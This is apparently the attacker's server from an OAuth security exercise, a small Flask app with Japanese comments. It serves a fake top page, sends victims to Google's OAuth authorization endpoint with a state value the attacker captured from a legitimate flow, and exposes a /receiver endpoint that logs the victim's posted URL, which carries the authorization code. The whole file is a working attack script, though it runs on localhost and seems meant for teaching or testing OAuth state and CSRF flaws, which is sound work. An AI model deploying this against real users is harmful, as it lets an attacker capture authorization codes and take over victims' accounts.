from flask import Flask, render_template, request, redirect
from urllib.parse import urlencode
from dotenv import load_dotenv
import os
from datetime import timedelta 

# load envファイル
load_dotenv()

app = Flask(__name__)

# redirect_uri
# 攻撃者は正常なページで認可リクエストを送信した際にURLから取得可能
REDIRECT_URI = 'http://localhost:8080/callback'

# OAuthに必要なClient ID
# 攻撃者は正常なページで認可リクエストを送信した際にURLから取得可能
CLIENT_ID = os.getenv('CLIENT_ID')

@app.route('/')
def index():
  '''
  トップページ（偽）
  '''
  return render_template('evil.html')

@app.route('/oauth')
def oauth():
  '''
  OAuthの認証を行う

  攻撃者は正常なページで認可リクエストを送信した際のstateを入力し、
  被害者が偽装された認可リクエストを送信するようにする
  '''

  state = "G83hTkYyGDjcYIb1zbp5WRdT86C5OS"

  base_url = "https://accounts.google.com/o/oauth2/v2/auth"
  params = {
    "response_type": "code",
    "client_id": CLIENT_ID,
    "state": state,
    "redirect_uri": REDIRECT_URI,
    "scope": "openid email profile"
  }
  url = base_url + "?" + urlencode(params)

  return redirect(url), 302

@app.route('/receiver', methods=['POST'])
def receiver():
  '''
  偽トップページから被害者のURL情報を受け取る
  '''
  json = request.get_json()
  print(json['location'])

  return 'ok', 200

if __name__ == "__main__":
  app.run(port=9262, debug=True, host="localhost")